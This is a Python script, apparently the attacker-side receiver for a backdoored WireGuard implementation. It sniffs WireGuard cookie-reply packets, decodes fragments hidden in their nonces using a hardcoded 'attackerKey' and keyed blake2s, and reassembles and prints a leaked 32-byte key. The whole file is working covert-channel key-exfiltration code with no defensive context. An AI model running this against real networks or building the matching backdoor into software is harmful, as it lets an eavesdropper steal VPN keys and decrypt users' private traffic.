import pyshark
from hashlib import blake2s
import base64

attackerKey = 0x1223344556677889
attackerKey_bytes = attackerKey.to_bytes(8, 'big')

capture = pyshark.LiveCapture(interface='Ethernet')
# capture.set_debug()

receivedFragments = set()
key = 0

for packet in capture.sniff_continuously():
    if 'WG Layer' in str(packet.layers):
        if int(packet['WG'].type) is 3:
            nonce = str(packet['WG'].nonce).replace(':', '')
            keyIndex =int(nonce[:2], 16) & 0x1
            if keyIndex not in receivedFragments:
                nl_int = int(nonce[:16], 16)
                nl_bytes = nl_int.to_bytes(8,'big')
                nr_int = int(nonce[16:], 16)
                h = blake2s(key=attackerKey_bytes, digest_size=16)
                h.update(nl_bytes)
                hash_hex = h.hexdigest()
                hash_int = int(hash_hex, 16)
                keyFragment = nr_int ^ hash_int
                key += keyFragment << ((1-keyIndex) * 128)
                receivedFragments.add(keyIndex)
                print('Key fragment ' + str(keyIndex) + ' was received.')
                if len(receivedFragments) is 2:
                    break

print(hex(key))
print(base64.b64encode(key.to_bytes(32, 'big')))

try:
    capture.clear()
    capture.reset()
    capture.close()
except pyshark.capture.capture.TSharkCrashException as e:
    print('An error occurred when trying to close tshark.')
